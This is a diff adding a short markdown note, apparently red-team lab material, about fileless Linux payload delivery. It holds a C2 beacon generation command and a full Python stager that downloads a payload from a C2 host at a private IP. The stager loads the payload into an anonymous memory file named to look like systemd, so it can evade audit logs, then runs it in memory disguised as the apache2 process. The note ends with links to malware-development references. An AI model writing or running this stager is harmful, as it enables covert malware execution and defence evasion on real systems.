@@ -1,0 +1,62 @@
+# Generate
+- `generate beacon --http 192.168.31.128 -N Second --os linux`
+# Script
+```
+#!/usr/bin/env python3
+import os
+import urllib.request
+import sys
+
+def main():
+    # 1. C2サーバー（Kaliなど）のホストとポートを指定
+    # ※検証環境に合わせて変更してください
+    c2_url = "http://192.168.31.128:8080/second"
+    
+    print("[*] Downloading payload into memory...")
+    try:
+        # ディスクを介さず、メモリ上の変数（bytes）に直接格納
+        with urllib.request.urlopen(c2_url) as response:
+            payload = response.read()
+    except Exception as e:
+        print(f"[-] Download failed: {e}")
+        sys.exit(1)
+
+    print("[*] Creating anonymous memory file...")
+    # 2. memfd_createでメモリ内に匿名ファイル（ファイル記述子）を作成
+    # 引数の文字列は/proc/self/fd/ 内に表示される名前（監査ログを意識して偽装可能）
+    # MFD_CLOEXEC (1) を指定して、子プロセスに不要なFDを引き継がないようにする
+    try:
+        fd = os.memfd_create("systemd-service", flags=os.MFD_CLOEXEC)
+    except AttributeError:
+        print("[-] os.memfd_create is not supported on this Python/OS version.")
+        sys.exit(1)
+
+    # 3. メモリ内のファイル記述子にC2バイナリのデータを書き込む
+    os.write(fd, payload)
+    os.lseek(fd, 0, os.SEEK_SET)
+    
+    # 4. プロセス偽装（argv[0]の書き換え）
+    # ps aux コマンドなどで表示されるプロセス名を正規のもの（例: apache2）に見せかける
+    fake_process_name = "/usr/sbin/apache2"
+    argv = [fake_process_name]
+    env = os.environ
+
+    print("[+] Executing payload via fexecve...")
+    # 5. fexecveを実行して、現在のPythonプロセスをメモリ上のC2バイナリで上書き
+    # ディスク上のパスではなく、ファイル記述子(fd)から直接実行するため完全ファイルレス
+    try:
+        # os.fexecve(fd, argv, env)
+        fd_path = f"/proc/self/fd/{fd}"
+        os.execve(fd_path, argv, env)
+    except Exception as e:
+        print(f"[-] Execution failed: {e}")
+        sys.exit(1)
+
+if __name__ == "__main__":
+    main()
+```
+
+- `https://gist.github.com/zznop/0117c24164ee715e750150633c7c1782`
+- `https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html`
+- `https://mohitdabas.in/blog/linux-maldev-fileless-execution-memfd-create`
+- `https://www.reddit.com/r/redteamsec/comments/1ujq86q/sliver_stagers/`
